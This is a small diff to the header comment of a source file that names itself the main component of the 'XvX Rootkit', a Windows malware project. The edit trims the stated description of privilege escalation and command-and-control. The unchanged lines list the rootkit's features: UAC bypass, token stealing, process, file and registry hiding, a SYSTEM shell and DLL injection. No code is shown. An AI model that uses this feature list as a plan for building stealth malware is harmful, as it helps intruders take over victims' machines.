@@ -2,7 +2,7 @@
  * XvX Rootkit - Main Component
  * Copyright (c) 2025 - 28zaakypro@proton.me
  *
- * NT AUTHORITY\SYSTEM privilege escalation rootkit with C2 capabilities.
+ * NT AUTHORITY rootkit.
  * Features: UAC bypass, token stealing, process/file/registry hiding,
  * interactive SYSTEM shell, DLL injection, WMI monitoring.
  */
